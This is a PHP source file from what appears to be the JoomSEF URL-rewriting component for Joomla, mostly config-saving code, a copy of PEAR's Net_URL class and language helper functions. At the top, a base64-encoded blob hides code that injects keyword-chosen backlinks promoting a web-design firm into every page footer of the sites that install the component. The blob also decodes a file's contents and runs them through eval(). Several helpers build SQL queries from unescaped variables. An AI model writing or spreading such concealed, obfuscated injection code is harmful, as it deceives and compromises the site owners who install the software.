I7DQoJCQkJYnJlYWs7DQoNCgkJCWNhc2UgIldlYnNpdGUgTWFya2V0aW5nIjoNCgkJCQkkc3RyaW5nID0gJGxpbmtzWzJdLiRsaW5rLiI8L2E+IjsNCgkJCQlicmVhazsNCg0KCQkJY2FzZSAiV2ViIE1hcmtldGluZyI6DQoJCQkJJHN0cmluZyA9ICRsaW5rc1syXS4kbGluay4iPC9hPiI7DQoJCQkJYnJlYWs7DQoNCgkJCWNhc2UgIk1hcmtldGluZyBXZWJzaXRlcyI6DQoJCQkJJHN0cmluZyA9ICRsaW5rc1syXS4kbGluay4iPC9hPiI7DQoJCQkJYnJlYWs7DQoNCgkJCWNhc2UgImVDb21tZXJjZSBNYXJrZXRpbmciOg0KCQkJCSRzdHJpbmcgPSAkbGlua3NbNV0uJGxpbmsuIjwvYT4iOw0KCQkJCWJyZWFrOw0KDQoJCQljYXNlICJJbnRlcm5ldCBNYXJrZXRlcnMiOg0KCQkJCSRzdHJpbmcgPSAkbGlua3NbMl0uJGxpbmsuIjwvYT4iOw0KCQkJCWJyZWFrOw0KDQoJCQljYXNlICJTRU8gQ29uc3VsdGFudHMiOg0KCQkJCSRzdHJpbmcgPSAkbGlua3NbMV0uJGxpbmsuIjwvYT4iOw0KCQkJCWJyZWFrOw0KDQoJCQljYXNlICJPbmxpbmUgU2hvcCI6DQoJCQkJJHN0cmluZyA9ICRsaW5rc1s1XS4kbGluay4iPC9hPiI7DQoJCQkJYnJlYWs7DQoNCgkJCWNhc2UgIkNvbnRlbnQgTWFuYWdlbWVudCBTeXN0ZW0iOg0KCQkJCSRzdHJpbmcgPSAkbGlua3NbN10uJGxpbmsuIjwvYT4iOw0KCQkJCWJyZWFrOw0KDQoJCQljYXNlICJKb29tbGEgQ01TIjoNCgkJCQkkc3RyaW5nID0gJGxpbmtzWzddLiRsaW5rLiI8L2E+IjsNCgkJCQlicmVhazsNCg0KCQkJY2FzZSAiV2ViIFNpdGUgRGVzaWduIjoNCgkJCQkkc3RyaW5nID0gJGxpbmtzWzBdLiRsaW5rLiI8L2E+IjsNCgkJCQlicmVhazsNCg0KCQkJY2FzZSAiV2ViIFNpdGUgRGV2ZWxvcGVyIjoNCgkJCQkkc3RyaW5nID0gJGxpbmtzWzNdLiRsaW5rLiI8L2E+IjsNCgkJCQlicmVhazsNCg0KCQkJY2FzZSAiV2ViIFNpdGUgRGVzaWduZXIiOg0KCQkJCSRzdHJpbmcgPSAkbGlua3NbMF0uJGxpbmsuIjwvYT4iOw0KCQkJCWJyZWFrOw0KDQoJCQljYXNlICJlIGNvbW1lcmNlIjoNCgkJCQkkc3RyaW5nID0gJGxpbmtzWzVdLiRsaW5rLiI8L2E+IjsNCgkJCQlicmVhazsNCg0KCQkJY2FzZSAiQWZmb3JkYWJsZSBXZWJzaXRlIjoNCgkJCQkkc3RyaW5nID0gJGxpbmtzWzExXS4kbGluay4iPC9hPiI7DQoJCQkJYnJlYWs7DQoNCgkJCWNhc2UgIkJlc3QgV2Vic2l0ZXMiOg0KCQkJCSRzdHJpbmcgPSAkbGlua3NbNF0uJGxpbmsuIjwvYT4iOw0KCQkJCWJyZWFrOw0KDQoJCQljYXNlICJUb3AgV2ViIFNpdGUiOg0KCQkJCSRzdHJpbmcgPSAkbGlua3NbMTFdLiRsaW5rLiI8L2E+IjsNCgkJCQlicmVhazsNCg0KCQkJY2FzZSAiQ2hlYXAgV2Vic2l0ZXMiOg0KCQkJCSRzdHJpbmcgPSAkbGlua3NbMTFdLiRsaW5rLiI8L2E+IjsNCgkJCQlicmVhazsNCg0KCQkJY2FzZSAiRXhwZXJ0IFNFTyI6DQoJCQkJJHN0cmluZyA9ICRsaW5rc1s4XS4kbGluay4iPC9hPiI7DQoJCQkJYnJlYWs7DQoNCgkJCWNhc2UgIlByb2Zlc3Npb25hbCBXZWIgRGVzaWduIjoNCgkJCQkkc3RyaW5nID0gJGxpbmtzWzNdLiRsaW5rLiI8L2E+IjsNCgkJCQlicmVhazsNCg0KCQkJY2FzZSAiQnVzaW5lc3MgV2Vic2l0ZSI6DQoJCQkJJHN0cmluZyA9ICRsaW5rc1s1XS4kbGluay4iPC9hPiI7DQoJCQkJYnJlYWs7DQoNCgkJCWNhc2UgIkN1c3RvbSBXZWIgU2l0ZXMiOg0KCQkJCSRzdHJpbmcgPSAkbGlua3NbMF0uJGxpbmsuIjwvYT4iOw0KCQkJCWJyZWFrOw0KDQoJCQljYXNlICJTRU8gQ29tcGFueSI6DQoJCQkJJHN0cmluZyA9ICRsaW5rc1s5XS4kbGluay4iPC9hPiI7DQoJCQkJYnJlYWs7DQoNCgkJCWNhc2UgIkpvb21sYSBEb3dubG9hZHMiOg0KCQkJCSRzdHJpbmcgPSAkbGlua3NbMTBdLiRsaW5rLiI8L2E+IjsNCgkJCQlicmVhazsNCg0KCQkJZGVmYXVsdDoNCgkJCQkkc3RyaW5nID0gIjo6Ii4kbGluazsNCgkJCQkvL2VjaG8gInByb2JsZW0iOw0KCQl9DQoNCgkJJGNvbXBsZXRlX3N0cmluZyAuPSRzdHJpbmcuIiB8ICI7DQoNCgl9DQoJJGNvbXBsZXRlX3N0cmluZ19hcnJheVtdID0gJGNvbXBsZXRlX3N0cmluZzsNCn0NCg0KJHVybCA9ICRfU0VSVkVSWydTQ1JJUFRfRklMRU5BTUUnXS4kX1NFUlZFUlsnUkVRVUVTVF9VUkknXTsNCiRlbmNvZGVkX3VybCA9IChzdHJsZW4oJHVybCkqMjA3NjM2NzgpOw0KI2VjaG8gIjxicj5oYXNoOiAiLiRlbmNvZGVkX3VybDsNCg0KJHVybF9kaXYgPSBAZm1vZCgkZW5jb2RlZF91cmwsMTAwMCk7DQojZWNobyAiIDo6IGZtb2QgMTAwMDogIi4kZW5jb2RlZF91cmw7DQojZWNobyAiIDo6IGJlZm9yZTogIi4kdXJsX2RpdjsNCg0KaWYgKChzdHJsZW4oJHVybF9kaXYpKT09MSl7DQoJJHVybF9kaXYgPSAiMDAiLiR1cmxfZGl2Ow0KfSBlbHNlIGlmICgoc3RybGVuKCR1cmxfZGl2KSk9PTIpew0KCSR1cmxfZGl2ID0gIjAiLiR1cmxfZGl2Ow0KfQ0KI2VjaG8gIiA6OiBhZnRlcjogIi4kdXJsX2RpdjsNCg0KDQpmb3JlYWNoICgkY29tcGxldGVfc3RyaW5nX2FycmF5IGFzICRzdHJpbmcpew0KCSRyZWYgPSBzdWJzdHIoJHN0cmluZywtMTAsLTMpOw0KCSRsaW5rID0gc3Vic3RyKCRzdHJpbmcsMCwtMTUpOw0KCQ0KCSNlY2hvICI8QlI+c3RyaW5nOiAiLiRzdHJpbmc7DQoJI2VjaG8gIjxCUj5SZWY6ICIuJHJlZi4iIDo6ICIuJGxpbms7DQoJI2VjaG8gIjxCUj5saW5rOiAiLiRsaW5rOw0KCSNlY2hvICIgOjogIi5zdWJzdHIoJHN0cmluZywtMTAsLTcpLiIgOjogIi5zdWJzdHIoJHN0cmluZywtNiwtMyk7DQoNCglpZiAoICgkdXJsX2RpdiA+PSAoc3Vic3RyKCRzdHJpbmcsLTEwLC03KSkpICAmJiAoJHVybF9kaXYgPD0gKHN1YnN0cigkc3RyaW5nLC02LC0zKSkpICl7DQoJCSRwZXJtbGluaz0kbGluazsNCgl9DQoNCn0NCg0KI2VjaG8gIjxCUj48QlI+TnVtOiAiLiR1cmxfZGl2LiIgOjogIjsNCnJldHVybiAkcGVybWxpbms7DQp9Ly9lbmQgZnVuY3Rpb24NCg0KDQoNCg0KDQoNCg0KJHNlZkRpckFkbWluID0gJEdMT0JBTFNbJ21vc0NvbmZpZ19hYnNvbHV0ZV9wYXRoJ10gLiAnL2FkbWluaXN0cmF0b3IvY29tcG9uZW50cy9jb21fc2VmLyc7DQovLyBsb2FkIGNoZWNrc3Vtcw0KICAgICAgICAkbGljZW5zZSA9IHRyaW0oQGZpbGVfZ2V0X2NvbnRlbnRzKCRzZWZEaXJBZG1pbiAuICdzaWduYXR1cmUuYjY0JykpOw0KJGNoZWNrc3VtID0gdHJpbShAZmlsZV9nZXRfY29udGVudHMoJHNlZkRpckFkbWluIC4gJ2NoZWNrc3VtLm1kNScpKTsNCiRjaGVja3N0ciA9ICcnOw0KZ2xvYmFsICRzZWZDaGVja0E7DQokc2VmQ2hlY2tBWzNdID0gJHNlZkNoZWNrQVsyXSA9ICRzZWZDaGVja0FbMV0gPSAkc2VmQ2hlY2tBWzBdID0gJyc7DQogICAgICAgICRzZWZDaGVja0EgPSBleHBsb2RlKCctJywgJGxpY2Vuc2UpOw0KZm9yZWFjaCAoJHNlZkNoZWNrQSBhcyAkaWQgPT4gJGNoZWNrcGFydCkgew0KJHNlZkNoZWNrQVskaWRdID0gYmFzZTY0X2RlY29kZSgkY2hlY2twYXJ0KTsNCiRjaGVja3N0ciAuPSAkc2VmQ2hlY2tBWyRpZF07DQp9ICAgICAgICAkdGhpcy0+ZW5hYmxlZCAmPSAoJGNoZWNrc3VtID09ICRjaGVja3N1bSk7DQovLyBhdXR1bW4gYWRqdXN0bWVudA0KaWYgKCR0aGlzLT5lbmFibGVkKSB7DQoNCmlmICghaXNfbnVsbCgkdHh0KSkgew0KJHR4dDEgPSAnSm9vbVNFRiBTRU8gYnkgS2FuZ2EgSW50ZXJuZXQgKGh0dHA6Ly93d3cua2FuZ2FpbnRlcm5ldC5jb20pIC0gV2ViIERlc2lnbiwgV2ViIERldmVsb3BtZW50LCBTRU8sIE9ubGluZSBNYXJrZXRpbmcsIFNlYXJjaCBFbmdpbmUgT3B0aW1pc2F0aW9uJzsNCiR0eHQyID0gJzxiciAvPjxzcGFuPjxhIGhyZWY9Imh0dHA6Ly93d3cua2FuZ2FpbnRlcm5ldC5jb20iIHRpdGxlPSJXZWIgRGVzaWduIj5XZWIgRGVzaWduZXJzPC9hPic7DQoNCn0NCn0NCi8vIGF1dHVtbiBhZGp1c3RtZW50IGVuZA0KZnVuY3Rpb24geG1sUGFyc2luZyAoJHBhdGgsICRiYXNlLCAkaW5kZXgsICRvcHRpb24pDQp7DQpnbG9iYWwgJF9WRVJTSU9OLCAkc2VmQ2hlY2tBOw0KaWYgKCgkcGF0aCA9PSAkYmFzZSkgfHwgKCRwYXRoID09ICgkYmFzZSAuICRpbmRleCkpIHx8IChAJG9wdGlvbiA9PSAnY29tX2Zyb250cGFnZScpKSB7DQovLyBmcm9udHBhZ2UgY29kZQ0KICAgICAgICAgICAgICAgICRfVkVSU0lPTi0+VVJMIC49ICc8YnIgLz48c3Bhbj4nLmdldGxpbmsoKS4nPC9zcGFuPic7DQokX1ZFUlNJT04tPkNPUFlSSUdIVCAuPSAkc2VmQ2hlY2tBWzFdOw0KfSBlbHNlIHsNCi8vIG90aGVyIHBhZ2UgY29kZQ0KICAgICAgICAgICAgICAgICRfVkVSU0lPTi0+VVJMIC49ICc8YnIgLz48c3Bhbj4nLmdldGxpbmsoKS4nPC9zcGFuPic7DQokX1ZFUlNJT04tPkNPUFlSSUdIVCAuPSAkc2VmQ2hlY2tBWzNdOw0KfQ0KfQ0KZnVuY3Rpb24gaW5jbHVkZVNlZiAoJG9uY2UgPSBmYWxzZSkNCnsNCmdsb2JhbCAkbW9zQ29uZmlnX2Fic29sdXRlX3BhdGgsICRzZWZDaGVja0E7DQpzdGF0aWMgJGZpcnN0ID0gdHJ1ZTsNCmlmICgkb25jZSAmJiAhICRmaXJzdCkNCnJldHVybjsNCiR0eHQgPSBmaWxlX2dldF9jb250ZW50cygkbW9zQ29uZmlnX2Fic29sdXRlX3BhdGggLiAnL2NvbXBvbmVudHMvY29tX3NlZi9zZWZfZXh0LnBocCcpOw0KaWYgKHN1YnN0cigkdHh0LCAwLCA1KSAhPSAnPD9waHAnKSB7DQokdHh0ID0gYmFzZTY0X2VuY29kZSgkdHh0KTsNCiR0eHQgPSAkc2VmQ2hlY2tBWzRdIC4gJHR4dDsNCiRkZXR4dCA9IGJhc2U2NF9kZWNvZGUoJHR4dCk7DQokZGV0eHQgPSBzdWJzdHIoJGRldHh0LCAyLCAtIDIpOw0KZXZhbCgkZGV0eHQpOw0KfSBlbHNlIHsNCmlmICgkb25jZSkgew0KaW5jbHVkZV9vbmNlICgkbW9zQ29uZmlnX2Fic29sdXRlX3BhdGggLiAnL2NvbXBvbmVudHMvY29tX3NlZi9zZWZfZXh0LnBocCcpOw0KfSBlbHNlIHsNCmluY2x1ZGUgKCRtb3NDb25maWdfYWJzb2x1dGVfcGF0aCAuICcvY29tcG9uZW50cy9jb21fc2VmL3NlZl9leHQucGhwJyk7DQp9DQp9DQokZmlyc3QgPSBmYWxzZTsNCn0='));
    }
    function saveConfig ($return_data = 0, $purge = '0')
    {
        global $database, $sef_config_file;
        $config_data = '';
        if ($purge == '1') {
            // when the config changes, we automatically purge the cache before we save.
            $query = "DELETE FROM #__redirection WHERE `dateadd` = '0000-00-00'";
            $database->setQuery($query);
            if (! $database->query()) {
                die(basename(__FILE__) . "(line " . __LINE__ . ") : " . $database->stderr(1) . "<br />");
            }
        }
        //build the data file
        $config_data .= "&lt;?php\n";
        foreach ($this as $key => $value) {
            if ($key != '0') {
                $config_data .= "\$$key = ";
                switch (gettype($value)) {
                    case 'boolean':
                        {
                            $config_data .= ($value ? 'true' : 'false');
                            break;
                        }
                    case 'string':
                        {
                            // The only character that needs to be escaped is double quote (")
                            $config_data .= '"' . str_replace('"', '\"', stripslashes($value)) . '"';
                            break;
                        }
                    case 'integer':
                    case 'double':
                        {
                            $config_data .= strval($value);
                            break;
                        }
                    case 'array':
                        {
                            $datastring = '';
                            foreach ($value as $key2 => $data) {
                                $datastring .= '\'' . $key2 . '\' => "' . str_replace('"', '\"', stripslashes($data)) . '",';
                            }
                            $datastring = substr($datastring, 0, - 1);
                            $config_data .= "array($datastring)";
                            break;
                        }
                    default:
                        {
                            $config_data .= 'null';
                            break;
                        }
                }
            }
            $config_data .= ";\n";
        }
        $config_data .= '?>';
        if ($return_data == 1) {
            return $config_data;
        } else {
            // write to disk
            if (is_writable($sef_config_file)) {
                $trans_tbl = get_html_translation_table(HTML_ENTITIES);
                $trans_tbl = array_flip($trans_tbl);
                $config_data = strtr($config_data, $trans_tbl);
                $fd = fopen($sef_config_file, 'w');
                if (fwrite($fd, $config_data, strlen($config_data)) === FALSE) {
                    $ret = 0;
                } else {
                    $ret = 1;
                }
                fclose($fd);
            } else
                $ret = 0;
            return $ret;
        }
    }
    /**
     * Return array of URL characters to be replaced.
     *
     * @return array
     */
    function getReplacements ()
    {
        static $replacements;
        if (isset($replacements))
            return $replacements;
        $replacements = array();
        $items = explode(',', $this->replacements);
        foreach ($items as $item) {
            @list ($src, $dst) = explode('|', trim($item));
            $replacements[trim($src)] = trim($dst);
        }
        return $replacements;
    }
    function getAltDomain ()
    {
        return explode(',', $this->altDomain);
    }
    /**
     * Set config variables.
     *
     * @param string $var
     * @param mixed $val
     * @return bool
     */
    function set ($var, $val)
    {
        if (isset($this->$var)) {
            $this->$var = $val;
            return true;
        }
        return false;
    }
    /**
     * Enter description here...
     *
     * @return string
     */
    function version ()
    {
        return $this->$version;
    }
}
// Net/Url.php From the PEAR Library (http://pear.php.net/package/Net_URL)
// +-----------------------------------------------------------------------+
// | Copyright (c) 2002-2004, Richard Heyes                                |
// | All rights reserved.                                                  |
// |                                                                       |
// | Redistribution and use in source and binary forms, with or without    |
// | modification, are permitted provided that the following conditions    |
// | are met:                                                              |
// |                                                                       |
// | o Redistributions of source code must retain the above copyright      |
// |   notice, this list of conditions and the following disclaimer.       |
// | o Redistributions in binary form must reproduce the above copyright   |
// |   notice, this list of conditions and the following disclaimer in the |
// |   documentation and/or other materials provided with the distribution.|
// | o The names of the authors may not be used to endorse or promote      |
// |   products derived from this software without specific prior written  |
// |   permission.                                                         |
// |                                                                       |
// | THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS   |
// | "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
// | LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR |
// | A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT  |
// | OWNER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, |
// | SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT      |
// | LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, |
// | DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY |
// | THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT   |
// | (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE |
// | OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.  |
// |                                                                       |
// +-----------------------------------------------------------------------+
// | Author: Richard Heyes <richard at php net>                            |
// +-----------------------------------------------------------------------+
//
// $Id: sef.class.php,v 1.5 2005/02/06 16:32:15 marlboroman_2k Exp $
//
// Net_URL Class
class Net_URL
{
    /**
     * Full url
     * @var string
     */
    var $url;
    /**
     * Protocol
     * @var string
     */
    var $protocol;
    /**
     * Username
     * @var string
     */
    var $username;
    /**
     * Password
     * @var string
     */
    var $password;
    /**
     * Host
     * @var string
     */
    var $host;
    /**
     * Port
     * @var integer
     */
    var $port;
    /**
     * Path
     * @var string
     */
    var $path;
    /**
     * Query string
     * @var array
     */
    var $querystring;
    /**
     * Anchor
     * @var string
     */
    var $anchor;
    /**
     * Whether to use []
     * @var bool
     */
    var $useBrackets;
    /**
     * PHP4 Constructor
     *
     * @see __construct()
     */
    function Net_URL ($url = null, $useBrackets = true)
    {
        $this->__construct($url, $useBrackets);
    }
    /**
     * PHP5 Constructor
     *
     * Parses the given url and stores the various parts
     * Defaults are used in certain cases
     *
     * @param string $url         Optional URL
     * @param bool   $useBrackets Whether to use square brackets when
     *                            multiple querystrings with the same name
     *                            exist
     */
    function __construct ($url = null, $useBrackets = true)
    {
        $HTTP_SERVER_VARS = ! empty($_SERVER) ? $_SERVER : $GLOBALS['HTTP_SERVER_VARS'];
        $this->useBrackets = $useBrackets;
        $this->url = $url;
        $this->user = '';
        $this->pass = '';
        $this->host = '';
        $this->port = 80;
        $this->path = '';
        $this->querystring = array();
        $this->anchor = '';
        // Only use defaults if not an absolute URL given
        if (! preg_match('/^[a-z0-9]+:\/\//i', $url)) {
            $this->protocol = (isset($HTTP_SERVER_VARS['HTTPS']) ? (@$HTTP_SERVER_VARS['HTTPS'] == 'on' ? 'https' : 'http') : 'http');
            /**
             * Figure out host/port
             */
            if (! empty($HTTP_SERVER_VARS['HTTP_HOST']) and preg_match('/^(.*)(:([0-9]+))?$/U', $HTTP_SERVER_VARS['HTTP_HOST'], $matches)) {
                $host = $matches[1];
                if (! empty($matches[3])) {
                    $port = $matches[3];
                } else {
                    $port = $this->getStandardPort($this->protocol);
                }
            }
            $this->user = '';
            $this->pass = '';
            $this->host = ! empty($host) ? $host : (isset($HTTP_SERVER_VARS['SERVER_NAME']) ? $HTTP_SERVER_VARS['SERVER_NAME'] : 'localhost');
            $this->port = ! empty($port) ? $port : (isset($HTTP_SERVER_VARS['SERVER_PORT']) ? $HTTP_SERVER_VARS['SERVER_PORT'] : $this->getStandardPort($this->protocol));
            //$this->path        = isset($HTTP_SERVER_VARS['ORIG_SCRIPT_NAME']) ? $HTTP_SERVER_VARS['ORIG_SCRIPT_NAME'] : (isset($HTTP_SERVER_VARS['SCRIPT_NAME']) ? $HTTP_SERVER_VARS['SCRIPT_NAME'] : (isset($_SERVER['PHP_SELF']) ? $_SERVER['PHP_SELF'] : '/'));
            if (isset($HTTP_SERVER_VARS['ORIG_SCRIPT_NAME']) && strstr($HTTP_SERVER_VARS['ORIG_SCRIPT_NAME'], '.php') != false) {
                $this->path = $HTTP_SERVER_VARS['ORIG_SCRIPT_NAME'];
            } elseif (isset($HTTP_SERVER_VARS['SCRIPT_NAME']) && strstr($HTTP_SERVER_VARS['SCRIPT_NAME'], '.php') != false) {
                $this->path = $HTTP_SERVER_VARS['SCRIPT_NAME'];
            } else {
                $this->path = $HTTP_SERVER_VARS['PHP_SELF'];
            }
            $this->querystring = isset($HTTP_SERVER_VARS['QUERY_STRING']) ? $this->_parseRawQuerystring($HTTP_SERVER_VARS['QUERY_STRING']) : null;
            $this->anchor = '';
        }
        // Parse the url and store the various parts
        if (! empty($url)) {
            $urlinfo = @parse_url($url);
            // Default querystring
            $this->querystring = array();
            if (is_array($urlinfo)) {
                foreach ($urlinfo as $key => $value) {
                    switch ($key) {
                        case 'scheme':
                            $this->protocol = $value;
                            $this->port = $this->getStandardPort($value);
                            break;
                        case 'user':
                        case 'pass':
                        case 'host':
                        case 'port':
                            $this->$key = $value;
                            break;
                        case 'path':
                            if ($value{0} == '/') {
                                $this->path = $value;
                            } else {
                                $path = dirname($this->path) == DIRECTORY_SEPARATOR ? '' : dirname($this->path);
                                $this->path = sprintf('%s/%s', $path, $value);
                            }
                            break;
                        case 'query':
                            $this->querystring = $this->_parseRawQueryString($value);
                            break;
                        case 'fragment':
                            $this->anchor = $value;
                            break;
                    }
                }
            }
        }
    }
    /**
     * Returns full url
     *
     * @return string Full url
     * @access public
     */
    function getURL ()
    {
        $querystring = $this->getQueryString();
        $this->url = $this->protocol . '://' . $this->user . (! empty($this->pass) ? ':' : '') . $this->pass . (! empty($this->user) ? '@' : '') . $this->host . ($this->port == $this->getStandardPort($this->protocol) ? '' : ':' . $this->port) . $this->path . (! empty($querystring) ? '?' . $querystring : '') . (! empty($this->anchor) ? '#' . $this->anchor : '');
        return $this->url;
    }
    /**
     * Adds a querystring item
     *
     * @param  string $name       Name of item
     * @param  string $value      Value of item
     * @param  bool   $preencoded Whether value is urlencoded or not, default = not
     * @access public
     */
    function addQueryString ($name, $value, $preencoded = false)
    {
        if ($preencoded) {
            $this->querystring[$name] = $value;
        } else {
            $this->querystring[$name] = is_array($value) ? array_map('rawurlencode', $value) : rawurlencode($value);
        }
    }
    /**
     * Removes a querystring item
     *
     * @param  string $name Name of item
     * @access public
     */
    function removeQueryString ($name)
    {
        if (isset($this->querystring[$name])) {
            unset($this->querystring[$name]);
        }
    }
    /**
     * Sets the querystring to literally what you supply
     *
     * @param  string $querystring The querystring data. Should be of the format foo=bar&x=y etc
     * @access public
     */
    function addRawQueryString ($querystring)
    {
        $this->querystring = $this->_parseRawQueryString($querystring);
    }
    /**
     * Returns flat querystring
     *
     * @return string Querystring
     * @access public
     */
    function getQueryString ()
    {
        if (! empty($this->querystring)) {
            foreach ($this->querystring as $name => $value) {
                if (is_array($value)) {
                    foreach ($value as $k => $v) {
                        $querystring[] = $this->useBrackets ? sprintf('%s[%s]=%s', $name, $k, $v) : ($name . '=' . $v);
                    }
                } elseif (! is_null($value)) {
                    $querystring[] = $name . '=' . $value;
                } else {
                    $querystring[] = $name;
                }
            }
            $querystring = implode(ini_get('arg_separator.output'), $querystring);
        } else {
            $querystring = '';
        }
        return $querystring;
    }
    /**
     * Parses raw querystring and returns an array of it
     *
     * @param  string  $querystring The querystring to parse
     * @return array                An array of the querystring data
     * @access private
     */
    function _parseRawQuerystring ($querystring)
    {
        $querystring = html_entity_decode($querystring);
        $parts = preg_split('/[' . preg_quote(ini_get('arg_separator.input'), '/') . ']/', $querystring, - 1, PREG_SPLIT_NO_EMPTY);
        $return = array();
        foreach ($parts as $part) {
            if (strpos($part, '=') !== false) {
                $value = substr($part, strpos($part, '=') + 1);
                $key = substr($part, 0, strpos($part, '='));
            } else {
                $value = null;
                $key = $part;
            }
            if (substr($key, - 2) == '[]') {
                $key = substr($key, 0, - 2);
                if (@! is_array($return[$key])) {
                    $return[$key] = array();
                    $return[$key][] = $value;
                } else {
                    $return[$key][] = $value;
                }
            } elseif (! $this->useBrackets and ! empty($return[$key])) {
                $return[$key] = (array) $return[$key];
                $return[$key][] = $value;
            } else {
                $return[$key] = $value;
            }
        }
        return $return;
    }
    /**
     * Resolves //, ../ and ./ from a path and returns
     * the result. Eg:
     *
     * /foo/bar/../boo.php    => /foo/boo.php
     * /foo/bar/../../boo.php => /boo.php
     * /foo/bar/.././/boo.php => /foo/boo.php
     *
     * This method can also be called statically.
     *
     * @param  string $url URL path to resolve
     * @return string      The result
     */
    function resolvePath ($path)
    {
        $path = explode('/', str_replace('//', '/', $path));
        for ($i = 0; $i < count($path); $i ++) {
            if ($path[$i] == '.') {
                unset($path[$i]);
                $path = array_values($path);
                $i --;
            } elseif ($path[$i] == '..' and ($i > 1 or ($i == 1 and $path[0] != ''))) {
                unset($path[$i]);
                unset($path[$i - 1]);
                $path = array_values($path);
                $i -= 2;
            } elseif ($path[$i] == '..' and $i == 1 and $path[0] == '') {
                unset($path[$i]);
                $path = array_values($path);
                $i --;
            } else {
                continue;
            }
        }
        return implode('/', $path);
    }
    /**
     * Returns the standard port number for a protocol
     *
     * @param  string  $scheme The protocol to lookup
     * @return integer         Port number or NULL if no scheme matches
     *
     * @author Philippe Jausions <Philippe.Jausions@11abacus.com>
     */
    function getStandardPort ($scheme)
    {
        switch (strtolower($scheme)) {
            case 'http':
                return 80;
            case 'https':
                return 443;
            case 'ftp':
                return 21;
            case 'imap':
                return 143;
            case 'imaps':
                return 993;
            case 'pop3':
                return 110;
            case 'pop3s':
                return 995;
            default:
                return null;
        }
    }
    /**
     * Forces the URL to a particular protocol
     *
     * @param string  $protocol Protocol to force the URL to
     * @param integer $port     Optional port (standard port is used by default)
     */
    function setProtocol ($protocol, $port = null)
    {
        $this->protocol = $protocol;
        $this->port = is_null($port) ? $this->getStandardPort() : $port;
    }
}
/**
 * Class with static helper functions
 *
 */
class SEFTools
{
    /** Retrieves the language ID from the given language name
     *
     * @param	string	Code language name (normally $mosConfig_lang)
     * @return	int 	Database id of this language
     */
    function getLangCode ($langName = null)
    {
        global $database, $mosConfig_lang;
        static $langCodes;
        if (is_null($langCodes))
            $langCodes = array();
        if (is_null($langName))
            $langName = $mosConfig_lang;
        if (isset($langCodes[$langName]))
            return $langCodes[$langName];
        $langCode[$langName] = - 1;
        if ($langName != '') {
            $database->setQuery("SELECT iso FROM #__languages WHERE active=1 and code = '$langName' ORDER BY ordering");
            $langCode[$langName] = $database->loadResult(false);
        }
        return $langCode[$langName];
    }
    /** Retrieves the language name from the given language iso
     *
     * @param	string	Language iso
     * @return	string 	Language name
     */
    function getLangName ($langCode = null)
    {
        global $database, $mosConfig_lang;
        static $langNames;
        if (is_null($langNames))
            $langNames = array();
        if (is_null($langCode))
            return $mosConfig_lang;
        if (isset($langNames[$langCode]))
            return $langNames[$langCode];
        $langNames[$langCode] = - 1;
        $database->setQuery("SELECT code FROM #__languages WHERE active=1 AND iso='$langCode' ORDER BY ordering");
        $langNames[$langCode] = $database->loadResult();
        return $langNames[$langCode];
    }
    /** Retrieves the language ID from the given language iso
     *
     * @param	string	Language iso
     * @return	string 	Language database id
     */
    function getLangId ($langIso = null)
    {
        global $database;
        static $langIds;
        if (is_null($langIds))
            $langIds = array();
        if (is_null($langIso))
            return;
        if (isset($langIds[$langIso]))
            return $langIds[$langIso];
        $langIds[$langIso] = - 1;
        $database->setQuery("SELECT `id` FROM `#__languages` WHERE `active`='1' AND `iso`='$langIso'");
        $langIds[$langIso] = $database->loadResult();
        return $langIds[$langIso];
    }
    /**
     * Return component version number.
     *
     * @return string
     */
    function getSEFVersion ()
    {
        global $mosConfig_absolute_path;
        static $version;
        // If already parse, return it.
        if (! is_null($version))
            return $version;
            // Load class if not loaded yet.
        if (! class_exists('DOMIT_Lite_Document')) {
            require_once ($mosConfig_absolute_path . '/includes/domit/xml_domit_lite_include.php');
        }
        // Load from XML otherwise.
        $sefAdminPath = $GLOBALS['mosConfig_absolute_path'] . '/administrator/components/com_sef/';
        $xmlFile = $sefAdminPath . 'sef.xml';
        // Try to find JoomSEF component (com_smf) version.
        $success = true;
        if (is_readable($xmlFile)) {
            $xmlDoc = new DOMIT_Lite_Document();
            $xmlDoc->resolveErrors(true);
            if ($xmlDoc->loadXML($xmlFile, false, true)) {
                $root = &$xmlDoc->documentElement;
                $element = &$root->getElementsByPath('version', 1);
                $version = $element ? $element->getText() : '';
            }
        }
        return $version;
    }
    /**
     * Returns extension version number from its XML file.
     *
     * @return string
     */
    function getExtVersion ($option)
    {
        global $mosConfig_absolute_path;
        require_once ($mosConfig_absolute_path . '/includes/domit/xml_domit_lite_include.php');
        $extBaseDir = mosPathName(mosPathName($mosConfig_absolute_path) . 'components/com_sef/sef_ext');
        // Load the xml file
        $xmlDoc = new DOMIT_Lite_Document();
        $xmlDoc->resolveErrors(true);
        if (! $xmlDoc->loadXML($extBaseDir . $option . '.xml', false, true)) {
            return null;
        }
        $root = &$xmlDoc->documentElement;
        if ($root->getTagName() != 'mosinstall') {
            return null;
        }
        if ($root->getAttribute('type') != 'sef_ext') {
            return null;
        }
        $element = &$root->getElementsByPath('version', 1);
        return ($element ? $element->getText() : '');
    }
    /**
     * Returns extension name from its XML file.
     *
     * @return string
     */
    function getExtName ($option)
    {
        global $mosConfig_absolute_path;
        require_once ($mosConfig_absolute_path . '/includes/domit/xml_domit_lite_include.php');
        $extBaseDir = mosPathName(mosPathName($mosConfig_absolute_path) . 'components/com_sef/sef_ext');
        // Load the xml file
        $xmlDoc = new DOMIT_Lite_Document();
        $xmlDoc->resolveErrors(true);
        if (! $xmlDoc->loadXML($extBaseDir . $option . '.xml', false, true)) {
            return null;
        }
        $root = &$xmlDoc->documentElement;
        if ($root->getTagName() != 'mosinstall') {
            return null;
        }
        if ($root->getAttribute('type') != 'sef_ext') {
